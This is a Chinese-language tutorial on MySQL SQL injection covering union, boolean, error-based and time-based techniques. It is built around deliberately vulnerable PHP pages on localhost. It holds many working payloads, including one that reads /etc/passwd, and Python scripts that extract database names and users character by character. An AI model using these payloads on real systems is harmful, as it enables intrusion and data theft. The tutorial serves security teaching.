---
description: 总结SQL注入知识
---

# SQL注入

## SQL注入

所谓SQL注入，就是通过把SQL命令插入到Web[表单](https://baike.baidu.com/item/%E8%A1%A8%E5%8D%95/5380322)提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 \[1\] 比如先前的很多影视网站泄露VIP会员密码大多就是通过WEB表单递交查询字符暴出的，这类表单特别容易受到[SQL注入式攻击](https://baike.baidu.com/item/SQL%E6%B3%A8%E5%85%A5%E5%BC%8F%E6%94%BB%E5%87%BB)。

### SQL注入原理

SQL注入产生需要满足两个条件：

1. 参数可控：前端传给后端内容用户是可以控制的。
2. 参数带入数据库查询：传入的参数拼接到SQL语句，并且带入数据库查询。

### MySQL相关知识点

在MySQL5.0版本之后，MySQL默认在数据库存放了一个`information_schema`的数据库，其中有如下三个表需要大家了解。

#### SCHEMATA

`SCHEMATA`表存储了用户创建的所有数据库的库名，我们可以通过查询展示这一过程。

```text
SELECT * FROM SCHEMATA
```

![SCHEMATA](../../../.gitbook/assets/tu-pian%20%2852%29.png)

记录数据库库名的字段为`SCHEMA_NAME`

#### TABLES

`TABLES` 存储了用户创建的所有数据库的库名和表名，我们可以通过查询展示这一过程。

```text
SELECT * FROM TABLES
```

![TABLES](../../../.gitbook/assets/tu-pian%20%2894%29.png)

其中，`TABLE_SCHEMA` 记录了数据库的库名，`TABLE_NAME` 记录了表名。

COLUMNS

`COLUMNS` 存储了用户创建的所有数据库的库名、表名和字段名，我们可以通过查询展示这一过程。

```text
SELECT * FROM COLUMNS
```

![COLUMNS](../../../.gitbook/assets/tu-pian%20%2824%29.png)

其中，`TABLE_SCHEMA` 记录了数据库的库名，`TABLE_NAME` 记录了数据库的表名，`COLUMN_NAME` 记录了数据库的字段名。

#### MySQL查询语句

`SELECT 要查询的字段名 FROM 库名.表名 WHERE 已知条件1的字段名='已知条件1的值' AND 已知条件2的字段名='已知条件2的值'`

#### Limit

`limit` 使用格式为`limit m,n` 其中，`m` 是记录开始的位置，从`0` 开始，表示第一条记录，`n` 是取`n` 条记录，例如，`limit 0,1` 表示从第一条记录开始，取一条记录。

![LIMIT](../../../.gitbook/assets/tu-pian%20%2890%29.png)

#### 常用函数

| 函数名 | 备注 |
| :--- | :--- |
| database\(\) | 当前网站使用的数据库 |
| version\(\) | 当前MySQL的版本 |
| user\(\) | 当前MySQL的用户 |

#### 注释符

MySQL中，常见的注释符有`#` 或者`--` \(注意空格）或者`/**/` 。

#### 内联注释

内联注释的形式：`/*!code*/` ，内联注释可以用于整个SQL语句，用来执行我们的SQL语句。

[`SELECT`](http://localhost/phpMyAdmin4.8.5/url.php?url=https://dev.mysql.com/doc/refman/5.5/en/select.html) ``* FROM `SCHEMATA` /*!UNION*/ /*!SELECT*/ 1,``[`USER`](http://localhost/phpMyAdmin4.8.5/url.php?url=https://dev.mysql.com/doc/refman/5.5/en/information-functions.html#function_user)`(),3,4,5`

![&#x5185;&#x8054;&#x6CE8;&#x91CA;](../../../.gitbook/assets/tu-pian%20%2830%29.png)

### 注入方式

#### Union注入

如下代码：

```text
if (mysqli_connect_errno())
{
    echo "连接失败: " . mysqli_connect_error();
}

$id = $_GET['id'];

$result = mysqli_query($con,"select * from user where `id`=".$id);

while($row = mysqli_fetch_array($result))
{
    echo $row['USERNAME'] . " " . $row['PASSWORD'];
    echo "<br>";
}
?>
```

这里是一个正常的查询操作，但是由于没有进行任何的过滤，将参数直接拼接到了SQL语句中，语句也未进行预处理，并且`$_GET` 参数攻击者可控，因此攻击者可以利用SQL注入漏洞对系统发起攻击。

正常访问：

![&#x6B63;&#x5E38;&#x8BBF;&#x95EE;](../../../.gitbook/assets/tu-pian%20%2891%29.png)

在`id=1`后面添加`'`

![1&#x2019;&#x8FD4;&#x56DE;&#x4E3A;&#x7A7A;](../../../.gitbook/assets/tu-pian%20%2879%29.png)

这里说明有可能存在SQL注入，为了进一步判别是否存在漏洞，我们要进行验证是否可以进行逻辑运算，比如我们访问`id=1 and 1=1` ，由于`1=1` 为真，因此应返回与`id=1` 相同的页面，同样的，`id=1 and 1=2` 应返回不同的页面。

![and 1=1](../../../.gitbook/assets/tu-pian%20%2896%29.png)

![and 1=2](../../../.gitbook/assets/tu-pian%20%2850%29.png)

因此可以判断网站存在SQL注入漏洞，我们可以通过以下过程，通过漏洞模拟攻击者获得数据库相关信息。

1. 判断数据表字段数量`order by num` 
2. 判断可输出字段`union  select 1,2,...,num`
3. 替换可显示字段，输出我们想执行操作

![order by 3 &#x663E;&#x793A;&#x6B63;&#x5E38;](../../../.gitbook/assets/tu-pian%20%28103%29.png)

![order by 4 &#x663E;&#x793A;&#x4E0D;&#x6B63;&#x5E38;](../../../.gitbook/assets/tu-pian%20%2811%29.png)

说明一共有3个字段，接下来我们尝试哪个字段是可以输出的

![union select 1,2,3](../../../.gitbook/assets/tu-pian%20%288%29.png)

说明位置`2` 和`3` 是可以输出的，替换我们想执行的操作，以`user()` 和`database()` 举例

![union select 1,user\(\),database\(\)](../../../.gitbook/assets/tu-pian%20%2833%29.png)

可以得出当前用户是`root`用户，数据表为`users` 表，我们也可以通过控制`id` 参数，给其设定一个不存在的值，让其返回`union select` 的值

![id=-1 union select 1,user\(\),database\(\)](../../../.gitbook/assets/tu-pian%20%2874%29.png)

#### Boolean注入

如下代码：

```text
<?php
$con=mysqli_connect("localhost","root","root","users");
// 检测连接
if (mysqli_connect_errno())
{
    echo "连接失败: " . mysqli_connect_error();
}

$id = $_GET['id'];

if (preg_match("/union|sleep|benchmark/i", $id)) {
    exit("no");
}

$result = mysqli_query($con,"select * from user where `id`='".$id."'");

$row = mysqli_fetch_array($result);

if ($row) {
    exit("yes");
}else{
    exit("no");
}
?>
```

我们可以看到代码中还是通过`get` 方式获取`id` 的值，并且拼接到SQL语句中，但是前面做了一个正则匹配，如果检测到`union` 、`sleep` 、`benchmark` 就退出并返回`no` ，而且使用了`i` 修正符，因此会不区分大小写去文本中匹配 php，这意味着我们无法使用联合注入以及延时注入，并且是无法用大小写绕过的，后面的判断条件是如果SQL执行成功就会返回`yes` ，否则返回`no` ，这里可以判断为典型的boolean注入，我们可以使用如下过程模拟攻击者对系统发起攻击。

1. 通过 `' and length(database())>=num --+` 判断数据库名称长度，由于我们可以看到`id` 参数被`'` 包围，因此我们先闭合前面的单引号，使得后面我们的`payload` 得以正常执行。
2. 通过 `' and substr(database(),1,1)='t' --+` 逐字符判断的方式（不区分大小写）获取数据库名或通过 `' and ord(substr(database(),1,1)) = 115 --+`使用`ASCII` 转换函数`ord` 逐字符判断，这里里`substr` 是截取`database()` 的值，从第`1` 个字符开始，每次只返回`1` 个，这里不要与上面的`limit` 弄混，`limit` 是从`0` 开始排序的。

![&apos; and length\(database\(\)\)&amp;gt;=6 --+](../../../.gitbook/assets/tu-pian%20%2851%29.png)

当我们测试数据库长度大于等于`6` 时，报了`no` ，说明数据库长度为`5`

![&apos; and substr\(database\(\),1,1\)=&apos;u&apos; --+](../../../.gitbook/assets/tu-pian%20%28108%29.png)

当我们测试数据库第一个字符为`u` 时，报了`yes` ，说明数据库库名第一个字母为`u` ，我们可以写一个python脚本，来代替我们实现这一繁琐的过程。

```text
import requests

url = 'http://127.0.0.1/boolean.php?id=1'
for num in range(0,10):
    length_check_poc = "' and length(database())>=" + str(num) + " --+"
    r = requests.get(url + length_check_poc)
    if r.text == 'no':
        print('[+]数据库库名长度为： ' + str(num-1))
        exit()
```

我们可以看到数据库库名长度为`5`

![&#x5224;&#x65AD;&#x6570;&#x636E;&#x5E93;&#x5E93;&#x540D;&#x957F;&#x5EA6;](../../../.gitbook/assets/tu-pian%20%2846%29.png)

```text
import requests

url = 'http://127.0.0.1/boolean.php?id=1'
poc_str = 'abcdefghijklmnopqrstuvwxyz0123456789'
for num in range(1,6):
    for char in poc_str:
        str_check_poc = "' and substr(database(),"+ str(num) +",1)='" + char + "' --+"
        r = requests.get(url + str_check_poc)
        if r.text == 'yes':
            print('[+]数据库库名第'+ str(num) +'个字符为' + char)
            break
```

我们可以看到数据库库名每个字符是什么，拼接到一起即数据库库名为`users`

![&#x5224;&#x65AD;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;](../../../.gitbook/assets/tu-pian%20%2832%29.png)

同样的，如果`substr()` 被禁用了，我们也可以使用`MID()` 或者`LEFT()` 来实现上述过程。

`SELECT MID(database(),1,1);`

![](../../../.gitbook/assets/tu-pian%20%2844%29.png)

`SELECT left(database(),1);`

![](../../../.gitbook/assets/tu-pian%20%2873%29.png)

除了上述使用函数的方法之外，其实我们还可以采用`正则匹配` 的方法来进行注入，因为是支持正则表达式的，比如我们可以使用：

`select user() regexp '^[a-z]';`

我们的数据库用户是`root` ，比如这里我们可以用正则表达式逐位判断是否用户名都是由小写字母组成的以及每一位是什么，比如，我们猜解第一位，当我们猜测`正确`时，返回值为`1`：

`select user() regexp '^r[a-z]';`

![](../../../.gitbook/assets/tu-pian%20%28100%29.png)

当我们猜测`不正确`时，返回值为`0` ：

`select user() regexp '^x[a-z]';`

![](../../../.gitbook/assets/tu-pian%20%2856%29.png)

由此我们就可以逐位猜解每个位置上的字母：

```text
select user() regexp '^r[a-z]';
select user() regexp '^ro[a-z]';
select user() regexp '^roo[a-z]';
select user() regexp '^root[a-z]';
...
select user() regexp '^root@localhost$';
```

POC：

```text
0' and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="test" AND user() REGEXP '^^r' LIMIT 0,1) --+
0' and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="test" AND user() REGEXP '^^ro' LIMIT 0,1) --+
...
0' and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="test" AND user() REGEXP '^^root@localhost$' LIMIT 0,1) --+
```

同样的，我们可以写成脚本来代替我们进行操作：

```text
import requests

result_list = []
poc_str = 'abcdefghijklmnopqrstuvwxyz0123456789!@#$'
while True:
    for char in poc_str:
        str_check_poc = r"http://127.0.0.1/boolean.php?id=0%27%20and%201=(SELECT%201%20FROM%20information_schema.tables%20WHERE%20TABLE_SCHEMA=%22test%22%20AND%20user()%20REGEXP%20%27^^"+ ''.join(result_list) + char +"%27%20LIMIT%200,1)%20--+"
        r = requests.get(str_check_poc)
        if r.text == 'yes':
            result_list.append(char)
            break
    if result_list[-1] == '$':
        exit(0)
    print('当前数据库用户为：' + ''.join(result_list) + '\n')
```

![](../../../.gitbook/assets/tu-pian%20%28107%29.png)

在MySQL中，与上述正则类似，我们还可以用`like` 匹配

`select user() like 'ro%'`

![](../../../.gitbook/assets/tu-pian%20%2881%29.png)

注意：

```text
MSSQL所用的正则表达式并不是标准正则表达式 ，该表达式使用 like关键词

default.asp?id=1 AND 1=(SELECT TOP 1 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" and table_name LIKE '[a-z]%' )

该查询语句中，select top 1 是一个组合哦，不要看错了。

如果要查询其它的表名，由于不能像mysql哪样用limit x,1，只能使用 table_name not in (select top x table_name from information_schema.tables) 意义是：表名没有在前x行里，其实查询的就是第x+1行。

例如 查询第二行的表名：

default.asp?id=1 AND 1=(SELECT TOP 1 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" and table_name NOT IN ( SELECT TOP 1 table_name FROM information_schema.tables) and table_name LIKE '[a-z]%' )

表达式的顺序：

'n[a-z]%' -> 'ne[a-z]%' -> 'new[a-z]%' -> 'news[a-z]%' -> TRUE

之所以表达式 news[a-z]查询后返回正确是应为%代表0-n个字符，使用"_"则只能代表一个字符。故确认后续是否还有字符可用如下表达式

'news%' TRUE -> 'news_' FALSE

同理可以用相同的方法获取字段，值。这里就不再详细描述了。
```

#### 报错注入

如下代码：

```text
<?php
$con=mysqli_connect("localhost","root","root","users");
// 检测连接
if (mysqli_connect_errno())
{
    echo "连接失败: " . mysqli_connect_error();
}

$username = $_GET['username'];

if($result = mysqli_query($con,"select * from user where `USERNAME`='".$username."'")){
    echo "ok";
}else{
    echo mysqli_error($con);
}

?>
```

从代码得知，只要是数据库连接正常，SQL语句正常执行，就会返回`ok` ，否则返回数据库连接错误信息，并显示到页面上，所以我们使用以下过程来模拟攻击者攻击的过程。

1. 让数据库执行语句出错，例如加入`'`，导致错误。
2. 利用报错`payload` 来模拟攻击者攻击系统

**Duplicate entry报错：**

这是由于多次查询插入重复键值导致count报错从而在报错信息中带入了敏感信息。

**Payload：**

```text
zhangsan' and(select 1 from (select count(*) ,concat(user(),floor(rand(0)*2))x from test.test group by x)a) --+
```

这其中有一个很奇特的现象就是，我们看到POC中有`rand(0)` ，在经过测试后发现，当数据表中有`1`条数据时，`rand()` 与`rand(0)` 均不报错，在数据表中有`2` 条数据时，`rand()` 随机报错，`rand(0)` 不报错，在数据表中有`3`条及以上数据时，`rand()` 随机报错，`rand(0)` 稳定报错，在探究这个报错原因之前，我们需要了解以下几个函数：

| 函数名 | 作用 |
| :--- | :--- |
| count\(\) | 计算总数 |
| concat\(\) | 连接字符串 |
| floor\(\) | 向下取整 |
| rand\(\) | 随机产生0~1的随机数 |
| rand\(0\) | 伪随机 |

这里主要是探究一下`rand()` 和`rand(0)` 的区别，我们都知道`rand()` 是随机产生一个0~1的随机数，那么`rand(0)` 呢？

我们首先看一下`rand()` ，我们执行如下语句。

[`SELECT`](http://localhost/phpMyAdmin4.8.5/url.php?url=https://dev.mysql.com/doc/refman/5.5/en/select.html) ```floor(rand()*2) FROM``test\`\`\`

![rand\(\)](../../../.gitbook/assets/tu-pian%20%2862%29.png)

我们发现在执行多次后，结果符合随机要求，那么我们再看一下`rand(0)` ，执行如下语句。

[`SELECT`](http://localhost/phpMyAdmin4.8.5/url.php?url=https://dev.mysql.com/doc/refman/5.5/en/select.html) ```floor(rand(0)*2) FROM``test\`\`\`

![rand\(0\)](../../../.gitbook/assets/tu-pian%20%2880%29.png)

我们发现，不论执行多少次，他的序列始终是一个固定值，按照`011011...` 排列，我们可以看到报错内容是`Duplicate entry '15.5.53' for key 'group_key'`，意思是说`group_key`条目重复，需要了解的是当我们使用group by进行分组查询的时候，数据库会生成一张虚拟表，整个过程是这样的，开始查询数据，取数据库数据，然后查看虚拟表是否存在，不存在则插入新记录，存在则`count(*)`字段直接加`1`，在这张虚拟表中，`group by`后面的字段作为主键，MySQL官方有给过提示，就是查询的时候如果使用`rand()`的话，该值会被计算多次，就是第一次是将`group by`后面的字段值到虚拟表中拿去对比前，首先获取`group by`后面的值；第二次是假设`group by`后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算。  
那么我们在看整个过程如下：

查询前，默认建立空的虚拟表如下：

| Title | Title |
| :--- | :--- |
| key | count\(\*\) |
| Content | Content |

取第一次记录的时候，首先执行`floor(rand(0)*2)` ，我们从`rand(0)` 的图中也可以知道，第一次值为`0` ，表中不存在，则继续执行插入操作，在插入操作的时候，进行了第二次运算，同理我们从图中得知，值为`1` ，插入虚表的`key`中，由于是第一条数据，所以`count(*)` 的值也为`1` ，此时第一条信息查询完毕，结果如下。

| key | count\(\*\) |
| :--- | :--- |
| 1 | 1 |

接下来查询第二条记录的时候，再次计算`floor(rand(0)*2)` ，从图中得知，已经进行到了第三次运算，它的值是`1` ，这时候发现数据已经存在，所以不再运算，`count(*)` 的值直接加`1` ，此时结果如下。

| key | count\(\*\) |
| :--- | :--- |
| 1 | 2 |

接下来查询第三条记录，再次计算`floor(rand(0)*2)` ，从图中得知，已经进行到了第四次运算，它的值是`0` ，虚拟表中没有响应的键值，则准备进行插入操作，进行了第五次运算，它的值为`1` ，然而`1` 这个主键已经存在于虚拟表中，由于键值必须唯一，因此导致报错。

从而我们也得知了为什么前面解释的数据量不同，`rand()` 与`rand(0)` 会有不同的反响。由于`rand()` 本身的随机性，因此有几率触发报错，而`rand(0)` 的稳定序列`011011...` 导致其在`3` 条数据以上稳定报错。

![](../../../.gitbook/assets/tu-pian%20%2828%29.png)

在研究明白上面的过程后，我们已经可以得到我们想要的Duplocate entry错误了，接下来就是加入我们的子查询了，我们用`concat()` 拼接，比如我们想要查询数据库的用户，命令如下。

`select count(*) ,concat(user(),floor(rand(0)*2))x from test group by x`

![](../../../.gitbook/assets/tu-pian%20%28104%29.png)

我们可以看到已经看到想要的内容了，那么是不是直接拼接到后面就行了呢？

```text
SELECT * FROM test WHERE name = 'ddd ' and select count(*) ,concat(user(),floor(rand(0)*2))x from test group by x -- '
```

结果是不行的，因为我们在数据库中的代码如上，

![](../../../.gitbook/assets/tu-pian%20%2889%29.png)

我们构建的`select`语句的结果是一个结果表，而`and`需要一个布尔值，也就是`0`或`非零`的值，所以我们需要再嵌套一个查询，由于`select` 的结果是一个结果表，那我们就可再从这个表执行查询，这不过这次select的值是非零数字：

```text
zhangsan' and(select 1 from (select count(*) ,concat(user(),floor(rand(0)*2))x from test.test group by x)a) --+
```

到此我们也就完成了我们的报错注入。

当然我们也发现，这个poc中需要知道数据库相应的表名`test.test` ，那么如果我们不知道关键表名或者关键表名被禁用了怎么办呢？

我们可以使用如下语句来进行注入：

`select count(*) from (select 1 union select null union select !1)a group by concat(version(),floor(rand(0)*2))`

![](../../../.gitbook/assets/tu-pian%20%2820%29.png)

换成POC：

`zhangsan' and(select 1 from (select count(*) from (select 1 union select null union select !1)a group by concat(version(),floor(rand(0)*2)))a) --+`

![](../../../.gitbook/assets/tu-pian%20%2825%29.png)

这里我们首先需要知道如下规则：

| 语句 | 含义 |
| :--- | :--- |
| UNION | 将多个不同的select语句执行的结果合并到一个结果集并返回 |
| SELECT 1; | 直接返回字面量1的值 |
| SELECT null; | 返回null本身的“值”。NULL是mysql中的一个常量，表示“没有值”，不是空字符串或0。 |
| SELECT !1 | 逻辑非，非真即假，mysql中使用数字值1、0代表true和false，可用“SELECT TRUE, FALSE;”验证 |

其次，我们也要清楚，`select` 可以当作运算器，例如：

```text
mysql> select 1+1; //加法
+-----+
| 1+1 |
+-----+
|   2 |
+-----+

mysql> select pow(2,3); //指数运算，2的3次方
+----------+
| pow(2,3) |
+----------+
|        8 |
+----------+

mysql> select !0;  //逻辑非
+----+
| !0 |
+----+
|  1 |
+----+

mysql> select 1 & 1;  //按位与
+-------+
| 1 & 1 |
+-------+
|     1 |
+-------+

mysql> set @a=10,@b=5;  //变量赋值后再运算
mysql> select @a+@b;
+-------+
| @a+@b |
+-------+
|    15 |
+-------+
```

因此语句的最终结果为：

```text
mysql> SELECT 1 UNION SELECT null UNION SELECT !1;
+------+
| 1    |
+------+
|    1 |
| NULL |
|    0 |
+------+
```

与上同理，正好满足三条的需要，最终多次查询插入重复键值导致count报错从而在报错信息中带入了敏感信息。

如果`rand` 被禁用了，我们可以通过用户变量来报错：

`select min(@a:=1) from information_schema.tables group by concat(version(),@a:=(@a+1)%2);`

![](../../../.gitbook/assets/tu-pian%20%2838%29.png)

这里我们需要注意，由于浏览器会进行`urlencode` ，所以我们语句中的`+` 会被转为`空格` ，会导致我们的语句无法正常的传入数据库，因此我们需要用`%2b` 替换`+` ，因此最终POC如下：

`ddd%20%27%20and%20(select%20min(@a:=1)%20from%20test%20group%20by%20concat(version(),@a:=(@a%2b1)%2))%20--+`

![](../../../.gitbook/assets/tu-pian%20%2878%29.png)

**Xpath报错：**

MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml

| 名称 | 描述 |
| :--- | :--- |
| [`ExtractValue()`](https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_extractvalue) | 使用XPath表示法从XML字符串中提取值 |
| [`UpdateXML()`](https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_updatexml) | 返回替换的XML片段 |

通过这两个函数可以完成报错注入**。**

由官网文档可知， `ExtractValue(xml_frag, xpath_expr)` 有两个字符串参数， 一个XML标记片段 `xml_frag`和一个XPath表达式 `xpath_expr`（也称为定位器）; 它返回`CDATA`第一个文本节点的`text()`，该节点是XPath表达式匹配的元素的子元素。

例如：`SELECT ExtractValue('<a><b><b/></a>', '/a/b');` 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容， **注意：extractvalue\(\)能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring\(\)函数截取，一次查看32位，且不支持低版本 MySQL。**

比如我们输入：

```text
SELECT ExtractValue('<a><b><b/></a>', '~');
```

会引发错误：

![](../../../.gitbook/assets/tu-pian%20%2872%29.png)

我们仍然可以利用`concat`函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。

```text
SELECT ExtractValue('<a><b><b/></a>',concat('~',(SELECT version())));
```

这时我们已经可以在报错信息中看到版本号了：

![](../../../.gitbook/assets/tu-pian%20%28102%29.png)

POC：

```text
ddd%27and%20(extractvalue(1,concat(0x26,(version()),0x26)));--+
```

![](../../../.gitbook/assets/tu-pian%20%2843%29.png)

`UpdateXML(xml_target, xpath_expr, new_xml)` ，由官网文档可知，此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 `xml_target` 新的XML片段 `new_xml` ，然后返回更改的XML。`xml_target`替换的部分 与`xpath_expr` 用户提供的XPath表达式匹配。

如果`xpath_expr`未找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 `xml_target`XML片段。所有三个参数都应该是字符串。使用方式如下：

```text
SELECT
UpdateXML('<a><b>ccc</b><d></d></a>', '/a', '<e>fff</e>') AS val1,
UpdateXML('<a><b>ccc</b><d></d></a>', '/b', '<e>fff</e>') AS val2,
UpdateXML('<a><b>ccc</b><d></d></a>', '//b', '<e>fff</e>') AS val3,
UpdateXML('<a><b>ccc</b><d></d></a>', '/a/d', '<e>fff</e>') AS val4,
UpdateXML('<a><d></d><b>ccc</b><d></d></a>', '/a/d', '<e>fff</e>') AS val5
```

![](../../../.gitbook/assets/tu-pian%20%2841%29.png)

同理，和上面的extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容：

```text
SELECT UPDATEXML('test',concat('~',(SELECT version())),'test')
```

![](../../../.gitbook/assets/tu-pian%20%2865%29.png)

POC：

```text
ddd'and (SELECT UPDATEXML('test',concat('~',(SELECT version())),'test'));--+
```

![](../../../.gitbook/assets/tu-pian%20%2815%29.png)

**同extractvalue\(\)函数，updatexml\(\)函数能查询字符串的最大长度也是32，如果超过则也需要使用substring\(\)函数截取，一次查看32位。**

**整形溢出报错：**

在[BIGINT Overflow Error Based SQL Injection](https://osandamalith.com/2015/07/08/bigint-overflow-error-based-sql-injection/) 中，作者发现当MySQL版本在`5.5.5` 及其以上时，会存在`BIGINT溢出` 的现象（实测`5.5.29` 复现成功，`5.7.26` 以及`8.0.12` 失败，当mysql版本&gt;`5.5.53`时，无法利用`exp()`函数）

数据类型对应的范围如下：

![](../../../.gitbook/assets/tu-pian%20%2861%29.png)

也就是说如果我们使用例如`加法` 的运算表达式使得数值超越了最大值，就会触发`BIGINT value is out of range” error`

例如：

```text
SELECT 18446744073709551615 + 1 ;
```

![](../../../.gitbook/assets/tu-pian%20%2813%29.png)

我们如果对`0` 取反，就会得到这个BIGINT的最大值`18446744073709551615`

![](../../../.gitbook/assets/tu-pian%20%289%29.png)

因此，我们对`~0` 进行加减操作同样会造成溢出。

```text
SELECT 1+~0
```

![](../../../.gitbook/assets/tu-pian%20%2848%29.png)

因此我们只需要利用子查询引起BITINT溢出，从而设法提取数据。我们知道，如果一个查询成功返回，其返回值为`0`，所以对其进行逻辑非的话就会变成`1` 。

例如：

```text
select (select*from(select user())x);
```

![](../../../.gitbook/assets/tu-pian%20%2897%29.png)

```text
select !(select*from(select user())x);
```

![](../../../.gitbook/assets/tu-pian%20%28112%29.png)

由上我们就可以组合进行注入了：

```text
select ~0+!(select*from(select user())x);
```

![](../../../.gitbook/assets/tu-pian%20%2892%29.png)

我们已经成功的注入出了用户为`root` 。

但是我们一定要注意，`+` 在浏览器中会被编码为`空格` ，因此我们可以使用`-` 替换`+` 或者用`%2b` 替换`+` 。

```text
select !(select*from(select user())x) - ~0
```

![](../../../.gitbook/assets/tu-pian%20%2883%29.png)

与之类似的还有如下POC：

```text
(select(!x-~0)from(select(select user())x)a) 
(select!x-~0.from(select(select user())x)a)
```

由于对函数也可以进行取反操作，所以以下方式也是可以的：

```text
select !atan((select*from(select user())a))-~0; 
select !ceil((select*from(select user())a))-~0;
select !floor((select*from(select user())a))-~0;
```

作者经过测试，发现以下函数都是可以的（包括但不限于）：

```text
HEX
IN
FLOOR
CEIL
RAND
CEILING
TRUNCATE
TAN
SQRT
ROUND
SIGN
```

在发现`BIGINT` 溢出之后，作者发现，当传递一个大于709的值时，函数`exp()`就会引起一个溢出错误。 `exp()`即为以e为底的对数函数，如等式：

```text
select exp(2.70805020110221)
```

![](../../../.gitbook/assets/tu-pian%20%2819%29.png)

当涉及到注入时，我们使用否定查询来造成“`DOUBLE value is out of range`”的错误。作者之前的博文提到的，将0按位取反就会返回“`18446744073709551615`”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号`BIGINT`值。

```text
select exp(~(select*from(select user())x));
```

![](../../../.gitbook/assets/tu-pian%20%2836%29.png)

你可以通过`load_file()`函数来读取文件，但作者发现有13行的限制，该语句也可以在`BIGINT overflow injections`中使用。

```text
select exp(~(select*from(select load_file('/etc/passwd'))a));
```

注意，你无法写文件，因为这个错入写入的只是`0`。

```text
mysql> select exp(~(select*from(select 'hello')a)) into outfile 'C:/out.txt';
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'hello' from dual)))'    

# type C:\out.txt
0
```

**数据重复报错：**

在MySQL中，列名重复会报错，所以`name_const()`函数就是利用这一特性，重新定义一个重复的列名来让数据库报错。

```text
name_const(name,value)

返回给定值。 当用来产生一个结果集合列时, name_const()促使该列使用给定名称。
```

因此我们可以利用这一特点来利用报错带出我们的信息：

```text
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x
```

![](../../../.gitbook/assets/tu-pian%20%2869%29.png)

或者可以利用`join` 来查询

```text
select * from (select * from(select name_const(version(),0)) a join (select name_const(version(),0))b)c;
```

![](../../../.gitbook/assets/tu-pian%20%285%29.png)

#### 几何函数报错： <a id="toc-5"></a>

mysql有些几何函数，例如：

`geometrycollection()`，`multipoint()`，`polygon()`，`multipolygon()`，`linestring()`，`multilinestring()，`这些函数对参数要求是形如\(1 2,3 3,2 2 1\)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为`5.5.47`上可以用来注入，而在`5.7.17`上则不行：

```text
select multipoint((select * from (select * from (select version())a)b));
select GeometryCollection((select * from (select * from (select version())a)b));
select polygon((select * from (select * from (select version())a)b));
select * from user where id=1 and multipolygon((select * from(select * from(select user())a)b));
select * from user where id=1 and linestring((select * from(select * from(select user())a)b));
select * from user where id=1 and multilinestring((select * from(select * from(select user())a)b));
```

![](../../../.gitbook/assets/tu-pian%20%2854%29.png)

![](../../../.gitbook/assets/tu-pian%20%281%29.png)

**延时注入：**

如下代码：

```text
<?php
$con=mysqli_connect("localhost","root","root","test");
// 检测连接
if (mysqli_connect_errno())
{
    echo "连接失败: " . mysqli_connect_error();
}

$id = $_GET['id'];

if (preg_match("/union/i", $id)) {
    exit("<htm><body>no</body></html>");
}

$result = mysqli_query($con,"select * from user where `id`='".$id."'");

$row = mysqli_fetch_array($result);

if ($row) {
    exit("<htm><body>yes</body></html>");
}else{
    exit("<htm><body>no</body></html>");
}


?>
```

我们可以看到，程序获取`GET` 参数`ID` ，通过`preg_match` 判断参数`ID` 中是否存在`UNION` 危险字符，将参数`ID` 拼接到SQL语句中，从数据库中查询SQL语句，成功会返回`yes` ，否则会返回`no` ，除了用`boolean注入` 的方式之外，我们还可以利用`时间注入` 的方式，这样我们就可以解决一些类似于`页面无回显` ，`无报错信息` 甚至是`无法用布尔判断真假` 的情况， 提交对执行时间铭感的函数sql语句，通过执行时间的长短来判断是否执行成功，比如：正确的话会导致时间很长，错误的话会导致执行时间很短，这就是所谓的延时注入，属于盲注的一种类型。我们可以使用`sleep()` 或者`benchmark` 等方法来验证是否存在注入。

**sleep\(\)：**

```text
SLEEP(duration) 
Sleeps (pauses) for the number of seconds given by the duration argument, then returns 0. The duration may have a fractional part. If the argument is NULL or negative, SLEEP() produces a warning, or an error in strict SQL mode.
```

我们可以看到这是一个休眠函数，我们对`duration` 参数设定相应的参数值，就会执行相应的休眠操作。

![](../../../.gitbook/assets/tu-pian%20%2847%29.png)

这时候我们就可以结合`IF()` 函数来结合进行判断。

```text
IF(expr1,expr2,expr3)
```

`if` 函数的语句如上，即如果`expr1` 为真，则返回值为`expr2` ，否则为`expr3` 。

因此我们可以利用：

```text
if(length(database())>1,sleep(5),1)
```

来进行判断，即如果数据库名称的长度大于`1`，则休眠`5` 秒，否则查询`1` 。

POC：

```text
1 ' and if(length(database())>1,sleep(5),1) --+
```

我们可以看到，当判断数据库名称长度`>1` 时，完成时间在`5` 秒左右。

![](../../../.gitbook/assets/tu-pian%20%2817%29.png)

而当条件改成`>10` 的时候，完成时间只有`115` 毫秒。

![](../../../.gitbook/assets/tu-pian%20%2814%29.png)

说明数据库名称长度在`1~10` 之间，我们同样可以写一个脚本来完成数据库长度的遍历工作。

```text
import requests
import time


for num in range(0,10):
    url = r'http://127.0.0.1/time.php?id=1%20%20%27%20and%20if(length(database())%3C='+ str(num) + ',sleep(5),1)%20--+'
    start = time.clock()
    r = requests.get(url)
    elapsed = (time.clock() - start)
    if elapsed >= 3:
        print('数据库长度为：' + str(num))
        exit()
```

